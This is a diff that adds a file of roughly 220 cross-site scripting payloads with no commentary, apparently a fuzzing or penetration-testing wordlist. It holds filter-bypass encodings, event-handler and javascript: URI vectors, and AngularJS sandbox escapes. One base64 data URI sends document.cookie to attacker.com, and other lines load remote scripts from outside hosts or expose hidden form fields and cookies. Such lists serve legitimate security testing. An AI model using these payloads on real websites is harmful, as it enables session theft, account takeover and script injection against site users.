@@ -1,0 +1,220 @@
+data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pO3dpbmRvdy5sb2NhdGlvbj0naHR0cHM6Ly9hdHRhY2tlci5jb20vJytkb2N1bWVudC5jb29raWU8L3NjcmlwdD4
+<img ̊ style="display:block;width:100%;height:100%;" onmouseover="$.getScript('http://danlec.com/xss.js')" >
+"--></style></ script >< script > alert ("XSS  ")</ script >
+﻿f=document.forms;for(i=0;i<f.length;i++){e=f[i].elements;for(n in e){if(e[n].type=='hidden'){alert(e[n].name+': '+e[n].value)}}}
+<img src=1 onerror=alert(1)>
+<iframe src=javascript:alert(1)>
+data:text/html,<img src=1 onerror=alert(1)>
+data:text/html,<iframe src=javascript:alert(1)>
+<script src=data:,alert(1)>
+<script src=//brutelogic.com.br/1.js>
+{{constructor.constructor('alert(1)')()}}
+<x ng-app>{{constructor.constructor('alert(1)')()}}
+<Svg OnLoad=alert(1)>
+<Script>alert(1)</Script>
+<svg onload=alert(1)//
+<svg onload="alert(1)"
+<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
+<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>
+<script/x>alert(1)</script>
+%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
+%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
+alert`1`
+setInterval`alert\x28document.domain\x29`
+setTimeout`alert\x28document.domain\x29`
+<svg onload=alert&lpar;1&rpar;>
+<svg onload=alert&#40;1&#41>
+[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']
+('\141\154\145\162\164\50\61\51')()
+(alert)(1)
+a=alert,a(1)
+[1].find(alert)
+top["al"+"ert"](1)
+top[/al/.source+/ert/.source](1)
+al\u0065rt(1)
+top['al\145rt'](1)
+top[8680439..toString(30)](1)
+GIF89a=//<script>
+alert(1)//</script>;
+eval(URL.slice(-8)) #alert(1)
+eval(location.hash.slice(1)) #alert(1)
+document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>
+<svg/onload=innerHTML=location.hash> #<img/src/onerror=alert(1)>
+"o<x>nmouseover=alert<x>(1)//
+"autof<x>ocus o<x>nfocus=alert<x>(1)//
+&lt;svg/onload&equals;alert(1)&gt;
+<script src=https://www.google.com/complete/search?client=chrome
+%26jsonp=alert(1);></script>
+<script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js>
+</script><x ng-app ng-csp>{{constructor.constructor('alert(1)')()}}
+<script src=data:,alert(1)>
+<iframe src=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<a href=javascript:alert(1)>click
+<math><brute href=javascript:alert(1)>click
+<form action=javascript:alert(1)><input type=submit>
+<isindex action=javascript:alert(1) type=submit value=click>
+<form><button formaction=javascript:alert(1)>click
+<form><input formaction=javascript:alert(1) type=submit value=click>
+<form><input formaction=javascript:alert(1) type=image value=click>
+<form><input formaction=javascript:alert(1) type=image src=SOURCE>
+<isindex formaction=javascript:alert(1) type=submit value=click>
+<object data=javascript:alert(1)>
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
+<svg><script xlink:href=data:,alert(1) />
+<math><brute xlink:href=javascript:alert(1)>click
+<x contenteditable onblur=alert(1)>lose focus!
+<x onclick=alert(1)>click this!
+<x oncopy=alert(1)>copy this!
+<x oncontextmenu=alert(1)>right click this!
+<x oncut=alert(1)>copy this!
+<x ondblclick=alert(1)>double click this!
+<x ondrag=alert(1)>drag this!
+<x contenteditable onfocus=alert(1)>focus this!
+<x contenteditable oninput=alert(1)>input here!
+<x contenteditable onkeydown=alert(1)>press any key!
+<x contenteditable onkeypress=alert(1)>press any key!
+<x contenteditable onkeyup=alert(1)>press any key!
+<x onmousedown=alert(1)>click this!
+<x onmousemove=alert(1)>hover this!
+<x onmouseout=alert(1)>hover this!
+<x onmouseover=alert(1)>hover this!
+<x onmouseup=alert(1)>click this!
+<x contenteditable onpaste=alert(1)>paste here!
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)><a href=%23x>click this!#x
+<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
+<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br>
+<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+<br><x id=x>#x
+<body onresize=alert(1)>press F12!
+<body onhelp=alert(1)>press F1!
+<marquee onstart=alert(1)>
+<marquee loop=1 width=0 onfinish=alert(1)>
+<audio src onloadstart=alert(1)>
+<video onloadstart=alert(1)><source>
+<input autofocus onblur=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<select onchange=alert(1)><option>1<option>2
+<menu id=x contextmenu=x onshow=alert(1)>right click me!
+<svg onload=alert(1)>
+</tag><svg onload=alert(1)>
+"></tag><svg onload=alert(1)>
+"onmouseover=alert(1)//
+"autofocus/onfocus=alert(1)//
+javascript:alert(1)
+data:text/html,<svg onload=alert(1)>
+'-alert(1)-'
+'-alert(1)//
+\'-alert(1)//
+'}alert(1);{'
+'}alert(1)%0A{'
+\'}alert(1);{//
+</script><svg onload=alert(1)>
+'onload=alert(1)><svg/1='
+'>alert(1)</script><script/1='
+*/alert(1)</script><script>/*
+*/alert(1)">'onload="/*<svg/1='
+`-alert(1)">'onload="`<svg/1='
+*/</script>'>alert(1)/*<script/1='
+p=<svg/1='&q='onload=alert(1)>
+p=<svg 1='&q='onload='/*&r=*/alert(1)'>
+"><svg onload=alert(1)>.gif
+
+';setInterval(x=>{b=document.body.style,b.marginTop=(b.marginTop=='4px')?'-4px':'4px';},5)//
+prompt(document.[cookie])
+-(confirm)(document.domain)//
+<img src="." alt="" onerror="alert('<b>zombie</b>')"/>
+"><img src="x onerror=alert(document.cookie)>
+<script>alert(1)</script>
+<a onclick="alert(document.domain);">/
+"><img src=x onerror=alert(4)>
+<svg/onload=prompt(1)>
+javascript:alert(document.domain)
+"><IFRAME SRC="javascript:alert("JamalC0m_Groups");"></IFRAME>
+'"><img src=x onerror=alert(document.domain)>
+<img src=# onerror=alert(document.cookie)>.
+[clickme](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+_odtTitle='\<script\>alert(\'xss by alexander korznikov\\n\\n\'\+document.domain);\<\/script\>';
+"</script><script>prompt(979663)</script>"
+onmouseover=alert('XSS') 
+');alert(1)//
+<style/onload=alert(document.domain)>
+}%0a{}*{x:expression(alert(1))}%0a{
+"><svg/onload=alert(2)>
+%3C/title%3E%3C/script/%22-alert%280%29-%22--%3E%22%3E%3Csvg/onload=prompt%28document.domain%29%3E
+<a onclick="alert(document.domain);">/
+<svg/onload=alert(document.domain)>/x
+“><img src=”x” onerror=prompt(document.domain)>
+"><svg/onload=alert(2)>
+{“><img src=x onerror=prompt(1);>}
+<img src=x onerror=alert(1)>
+javascript%3Aalert(/hello%2Bworld/)%3B//
+> <img src = x onerror = javascript: alert (1);
+&lt;img src=x onerror=alert(1) "
+<script>alert(1);//
+<marquee><font size=72>XSS
+"><img src=x onerror=prompt(7) 
+[clickme](javascript:prompt(document.cookie))
+[clickme](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
+![clickme](javascript:prompt(document.cookie))\
+<javascript:prompt(document.cookie)>  
+<&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+
+<script>window['alert'](document['domain'])<script>
+'-[document.domain,document.cookie].map(alert)-'
+<p onmouseover=alert('after');>After</p>
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
+http://A/A<img src=x onerror=alert('XSS_Success')>
+{{constructor.constructor('alert(1)')()}}
+{}.")));alert(1)//";
+<div ng-click="$event.path|orderBy:'alert(1)'">test</div>
+<div ng-click="$event.path|orderBy:'[].constructor.from([1],alert)'">test</div>
+constructor.constructor('alert(1)')()
+{}[['__proto__']]['x']=constructor.getOwnPropertyDescriptor;g={}[['__proto__']]['x']
+{}[['__proto__']]['y']=g(''.sub[['__proto__']],'constructor');
+{}[['__proto__']]['z']=constructor.defineProperty;
+d={}[['__proto__']]['z'];d(''.sub[['__proto__']],'constructor',{value:false});
+{}[['__proto__']]['y'].value('alert(1)')()
+{}.")));alert(1)//";
+o={};
+l=o[['__lookupGetter__']];
+(l=l)('event')().target.defaultView.location='javascript:alert(1)';
+x={y:''.constructor.prototype};
+x.y.charAt=[].join;
+[1]|orderBy:'x=alert(1)'
+constructor.constructor('alert(1)')()
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(`Evaluated Object Literal`)');}}
+{{x = [''.constructor.prototype]; x[0].charAt=[].join; $eval('x=alert(`Evaluated Array`)');}}
+{{ this.constructor.constructor('alert("foo")')() }}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+'a'.constructor[0]='\u003ciframe onload=alert(/Backdoored/)\u003e'; 
+{{'a'.constructor.prototype.charAt=[].join;eval('x=1} } };alert(1)//');}}
+&#12288;javascript:alert(1)
+<script>/*...*/`${'...'-"..."-alert/*...*/(1)}...`</script>
+<0123><b x="x">hejsan</b></0123><0123XXX><b x="x">hejsan</b></0123XXX><0123YYY><b x="x">hejsan</b></0123YYY><0123ZZZ><b x="x">hejsan</b></0123ZZZ><!-- 9 chars long -->
+<script>//&id=%0Aalert(/*&id=*/1);//&id=</script>
+<script>/*&id=*/'%2B"&id="%2Balert(/*&id=*/1);//&id=</script
+<script>//&id=%0Aalert(/*&id=*/1)//&id=</script
+<script>//&id=%0D-alert//&id=%0D(1)//&id=</script
+<script>//&id=%0aalert/*&id=*/(1);//&id=></script
+<script>//&id='%0A'%2B&id='%0A//&id=%0Ae=alert//&id=\%0Ae(1);'//&id='</script
+<script>//&id=%0aalert//&id=%0a(1)//&id=</script
+<script>//&id=%0Aalert//&id=%0A(1)//&id=</script
+<script>--&id=%0Aalert//&id=%0A(1)//&id=</script
+<script>/*&id=*/`${'-"&id="-alert/*&id=*/(1)}&id=`</script
+<script>/*...*/`${'...'-"..."-alert/*...*/(1)}...`</script>
+“>><<img src=x onerror=alert(1);//>>
+<img src="/" =_=" title="onerror='alert(document.domain)'">
+;<sc%00ript>alert/**/(1)</script>
+;<sc%00ript/test=’asdf’>alert/**/(1)</script>
+;<sc%00ript/test=’asdf’/te%00st2=’asdf’>alert/**/(1)</script>
+;</script><img/test='asdf'/sr%00c=''/on%00error=prompt>
+;</script><embed/test='asdf'/sr%00c='/'>
+;</script><embed/test=''/allowscr%00iptaccess='always'/s%00rc='//ctf.hol.es/xss.swf'//>
+</script><em;<;>;<embed /test=''/+allowscript%00acces%00s='al%00%09ways'+%09%00s%09r%00c='//ctf.hol.es/xss.swf'><em;&city-link-index=&id=9978655'+on%00error=al%00ert%00(1)'
+/%22))%3B%7Dcatch(e)%7Balert(%27XSS%27)%3B%7D//
+"'--!><Script /K/>prompt(1)//</Script /K/><!--#
